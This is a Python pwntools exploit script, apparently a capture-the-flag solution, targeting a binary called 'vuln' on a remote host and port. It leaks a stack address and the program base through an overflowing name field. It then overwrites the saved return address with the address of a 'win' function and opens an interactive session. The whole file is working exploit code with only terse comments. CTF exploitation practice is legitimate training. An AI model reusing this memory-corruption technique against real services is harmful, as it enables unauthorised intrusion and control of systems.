#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  9009
HOST = "14.225.212.104"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# Leak exe_base
p.sendafter(b"name: \n", b"A"*(0x8))
# input()
p.sendlineafter(b"option: ", b'4')
p.recvuntil(b"A"*8)
stack_leak = u64(p.recv(6) + b'\0\0')
stack_main = stack_leak + 0x50
log.info("stack_leak: " + hex(stack_leak))
log.info("stack_main: " + hex(stack_main))

pl = flat(b'a'*32, stack_main)

p.sendlineafter(b"again? ", pl)

p.sendlineafter(b"option: ", b'1')
p.recvuntil(b"Name: ")
exe_leak = u64(p.recv(6) + b'\0\0')
exe.address = exe_leak - 0x1234
log.info("exe_leak: " + hex(exe_leak))
log.info("exe_base: " + hex(exe.address))

win = exe.sym.win

# Overwrite saved rip
stack_rip = stack_main - 0x10
input()
p.sendlineafter(b"option: ", b'4')
pl = flat(b'a'*32, stack_rip)
p.sendlineafter(b"again? ", pl)

p.sendlineafter(b"option: ", b'3')
p.sendlineafter(b"edit: ", b'1')
p.sendafter(b"Ross : ", p64(win))

p.sendlineafter(b"option: ", b'5')

p.interactive()

#sau_read_name: main+469
#nhap option: main+529